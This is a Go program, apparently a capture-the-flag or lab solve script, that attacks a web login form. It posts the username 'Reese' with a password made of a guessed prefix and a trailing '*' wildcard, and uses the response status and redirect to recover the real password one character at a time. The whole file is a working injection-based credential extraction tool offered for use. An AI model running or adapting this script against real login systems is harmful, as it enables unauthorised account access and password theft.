package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
)

type retData struct {
	StatusCode int
	redirURL   string
}

//lookup list generator
func genLookup(n1, n2 int) []string {
	var lookup []string
	for i := n1; i <= n2; i++ {
		lookup = append(lookup, string(i))
	}
	return lookup
}

//request maker
func makeReq(URL, tmp string) retData {
	uname := "Reese"
	pass := tmp + "*"
	res, err := http.PostForm(URL, url.Values{
		"username": {uname},
		"password": {pass},
	})
	if err != nil {
		fmt.Println("ERR:", err)
		os.Exit(0)
	}
	defer res.Body.Close()
	return retData{res.StatusCode, res.Request.URL.String()}
}

func fuzz(URL string, payload *string, lookup []string) {
	lookupLen := len(lookup) - 1
	i := 0
	for i <= lookupLen {
		tmp := *payload + lookup[i]
		info := makeReq(URL, tmp)
		if info.StatusCode == 200 && info.redirURL == URL {
			if i != lookupLen {
				i = 0
			}
			*payload = tmp
		} else {
			i++
		}
		fmt.Println(tmp)

	}
}

func main() {
	args := os.Args[1:]
	if len(args) == 0 {
		fmt.Println("Invalid Input")
		os.Exit(0)
	}
	URL := args[0]
	var payload string = ""
	lookup := genLookup(48, 126) //generate lookup list using ascii values
	fmt.Println(lookup)
	fmt.Printf("starting...\n")
	fuzz(URL, &payload, lookup)
	fmt.Println(payload)
}

